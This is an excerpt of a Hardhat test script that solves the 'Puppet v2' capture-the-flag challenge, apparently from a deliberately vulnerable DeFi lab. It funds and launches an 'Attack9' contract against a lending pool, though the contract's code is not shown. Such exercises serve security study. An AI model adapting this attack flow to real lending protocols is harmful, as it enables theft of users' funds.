...
describe("[Challenge] Puppet v2", function () {
  ...
  const POOL_INITIAL_TOKEN_BALANCE = 1_000_000n * 10n ** 18n;
  ...
  it("Execution", async function () {
    ...
    const Attack9 = await ethers.getContractFactory("Attack9", deployer);
    const attack9 = await Attack9.deploy(
      lendingPool.address,
    ...
    await token
      .connect(player)
      .transfer(attack9.address, PLAYER_INITIAL_TOKEN_BALANCE);

    // Swap ETH for WETH (keep 0.1 ETH for gas)
    await weth.connect(player).deposit({
      value:
        PLAYER_INITIAL_ETH_BALANCE - BigInt(ethers.utils.parseEther("0.1")),
    });

    // Send WETH to contract
    const wethBalance = await weth.balanceOf(player.address);
    await weth.connect(player).transfer(attack9.address, wethBalance);

    // Launch the attack
    await attack9.attack();

    // Optional: Swap WETh back to ETH
    await weth.connect(player).withdraw(await weth.balanceOf(player.address));
    ...
    console.log(
      "New player eth balance: ",
      ethers.utils.formatEther(playerEthBalance).toString()
    );
  });
